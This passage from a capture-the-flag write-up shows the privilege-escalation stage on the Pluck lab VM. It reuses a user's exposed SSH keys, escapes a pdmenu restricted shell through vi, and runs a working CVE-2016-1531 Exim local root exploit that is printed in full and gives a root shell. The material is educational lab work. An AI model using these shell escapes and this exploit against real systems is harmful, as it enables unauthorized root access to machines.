-</span><span class='line'>total 20
-</span><span class='line'>drwxr-xr-x 2 1000 1000 4096 Jan 18 07:43 .
-</span><span class='line'>drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
-</span><span class='line'>-rw-r--r-- 1 1000 1000  220 Jan 18 00:39 .bash_logout
-</span><span class='line'>-rw-r--r-- 1 1000 1000 3771 Jan 18 00:39 .bashrc
-</span><span class='line'>-rw-r--r-- 1 1000 1000  655 Jan 18 00:39 .profile
-</span><span class='line'>-rw-r--r-- 1 1000 1000    0 Jan 18 03:40 .sudo_as_admin_successful</span></code></pre></td></tr></table></div></figure>
-
-
-<p>That sudo file was empty. On to paul:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/home/paul# ls -la
-</span><span class='line'>total 24
-</span><span class='line'>drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 .
-</span><span class='line'>drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
-</span><span class='line'>-rw-r--r-- 1 1002 1002  220 Jan 18 03:04 .bash_logout
-</span><span class='line'>-rw-r--r-- 1 1002 1002 3771 Jan 18 03:04 .bashrc
-</span><span class='line'>drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 keys
-</span><span class='line'>-rw-r--r-- 1 1002 1002  655 Jan 18 03:04 .profile
-</span><span class='line'>root@kali:~/home/paul# ls -la keys/
-</span><span class='line'>total 56
-</span><span class='line'>drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 .
-</span><span class='line'>drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 ..
-</span><span class='line'>-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key1
-</span><span class='line'>-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key1.pub
-</span><span class='line'>-rwxrwxr-x 1 1002 1002  672 Jan 18 13:08 id_key2
-</span><span class='line'>-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key2.pub
-</span><span class='line'>-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key3
-</span><span class='line'>-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key3.pub
-</span><span class='line'>-rwxrwxr-x 1 1002 1002 1679 Jan 18 13:09 id_key4
-</span><span class='line'>-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key4.pub
-</span><span class='line'>-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key5
-</span><span class='line'>-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key5.pub
-</span><span class='line'>-rwxrwxr-x 1 1002 1002 1675 Jan 18 13:09 id_key6
-</span><span class='line'>-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key6.pub</span></code></pre></td></tr></table></div></figure>
-
-
-<p>It looks like paul didn&rsquo;t put much effort into securing his SSH keys. Lastly, peter:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/home/peter# ls -la
-</span><span class='line'>total 20
-</span><span class='line'>drwxr-xr-x 2 1001 1001 4096 Jan 18 03:04 .
-</span><span class='line'>drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
-</span><span class='line'>-rw-r--r-- 1 1001 1001  220 Jan 18 03:04 .bash_logout
-</span><span class='line'>-rw-r--r-- 1 1001 1001 3771 Jan 18 03:04 .bashrc
-</span><span class='line'>-rw-r--r-- 1 1001 1001  655 Jan 18 03:04 .profile</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Privilege escalation</h2>
-
-<p>Back to paul, and trying those SSH keys. Tried each, the 4th one worked, but it dropped me to this menu:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/pluck/pdmenu.png" title="pdmenu" alt="pdmenu"></p>
-
-<p>So, what is pdmenu?</p>
-
-<blockquote><p>Pdmenu is a full screen menuing system for Unix. It is designed to be easy to use, and is suitable as a login shell
-for inexperienced users, or it can just be ran at the command line as a handy menu.</p></blockquote>
-
-<p>Not much I can do with this, however, the option to edit a file launches vi! I remembered another challenge where vi helped me escape shell restrictions, and found a <a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">SANS article</a> about this exact topic. To get a proper shell, I typed the following in vi&rsquo;s command mode:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>:set shell=/bin/bash
-</span><span class='line'>:!bash</span></code></pre></td></tr></table></div></figure>
-
-
-<p></p>
-
-<p>That dropped me into paul&rsquo;s shell:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>paul@pluck:~$ id
-</span><span class='line'>uid=1002(paul) gid=1002(paul) groups=1002(paul)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>SUID enumeration led me to the next step:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>paul@pluck:~$ find / -perm -4000 2&gt;/dev/null
-</span><span class='line'>/usr/exim/bin/exim-4.84-7
-</span><span class='line'>/usr/bin/passwd
-</span><span class='line'>/usr/bin/at
-</span><span class='line'>/usr/bin/newgrp
-</span><span class='line'>/usr/bin/pkexec
-</span><span class='line'>/usr/bin/sudo
-</span><span class='line'>/usr/bin/traceroute6.iputils
-</span><span class='line'>/usr/bin/newuidmap
-</span><span class='line'>/usr/bin/chfn
-</span><span class='line'>/usr/bin/gpasswd
-</span><span class='line'>/usr/bin/newgidmap
-</span><span class='line'>/usr/bin/chsh
-</span><span class='line'>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-</span><span class='line'>/usr/lib/policykit-1/polkit-agent-helper-1
-</span><span class='line'>/usr/lib/s-nail/s-nail-privsep
-</span><span class='line'>/usr/lib/openssh/ssh-keysign
-</span><span class='line'>/usr/lib/eject/dmcrypt-get-device
-</span><span class='line'>/bin/su
-</span><span class='line'>/bin/umount
-</span><span class='line'>/bin/mount
-</span><span class='line'>/bin/fusermount
-</span><span class='line'>/bin/ping
-</span><span class='line'>/bin/ntfs-3g</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Exim is a MTA similar to sendmail. Googling for an exploit yielded a <a href="https://www.exploit-db.com/exploits/39535/">local root exploit</a>. I used vi to create a shell script with the exploit code, changed it to executable and ran it:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>paul@pluck:~$ vi rootme.sh 
-</span><span class='line'>paul@pluck:~$ cat rootme.sh 
-</span><span class='line'>echo [ CVE-2016-1531 local root exploit
-</span><span class='line'>cat &gt; /tmp/root.pm &lt;&lt; EOF
-</span><span class='line'>package root;
-</span><span class='line'>use strict;
-</span><span class='line'>use warnings;
-</span><span class='line'> 
-</span><span class='line'>system("/bin/sh");
-</span><span class='line'>EOF
-</span><span class='line'>PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
-</span><span class='line'>
-</span><span class='line'>paul@pluck:~$ ./rootme.sh 
-</span><span class='line'>[ CVE-2016-1531 local root exploit
-</span><span class='line'># whoami
-</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The flag is mine!</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># cat /root/flag.txt
-</span><span class='line'>
-</span><span class='line'>Congratulations you found the flag
-</span><span class='line'>
-</span><span class='line'>---------------------------------------
-</span><span class='line'>
-</span><span class='line'>######   ((((((((((((((((((((((((((((((
-</span><span class='line'>#########   (((((((((((((((((((((((((((
-</span><span class='line'>,,##########   ((((((((((((((((((((((((
-</span><span class='line'>@@,,,##########   (((((((((((((((((((((
-</span><span class='line'>@@@@@,,,##########                     
-</span><span class='line'>@@@@@@@@,,,############################
-</span><span class='line'>@@@@@@@@@@@,,,#########################
-</span><span class='line'>@@@@@@@@@,,,###########################
-</span><span class='line'>@@@@@@,,,##########                    
-</span><span class='line'>@@@,,,##########   &&&&&&&&&&&&&&&&&&&&
-</span><span class='line'>,,,##########   &&&&&&&&&&&&&&&&&&&&&&&
-</span><span class='line'>##########   &&&&&&&&&&&&&&&&&&&&&&&&&&
-</span><span class='line'>#######   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Interesting twist on this VM with the pdbmenu escape!</p>
-
-<p><strong>Learn more</strong></p>
-
-<ul>
-<li><a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">escape restricted Linux shells</a></li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
-</span><span class='line'>/ Q: How many Zen masters does it take to \
-</span><span class='line'>| screw in a light bulb? A: None. The     |
-</span><span class='line'>| Universe spins the bulb, and the Zen    |
-</span><span class='line'>| master stays out                        |
-</span><span class='line'>|                                         |
-</span><span class='line'>\ of the way.                             /
-</span><span class='line'> -----------------------------------------
-</span><span class='line'>        \   ^__^
-</span><span class='line'>         \  (oo)\_______
-</span><span class='line'>            (__)\       )\/\
-</span><span class='line'>                ||----w |
-</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
-
-
 
 ]]></content>
   </entry>
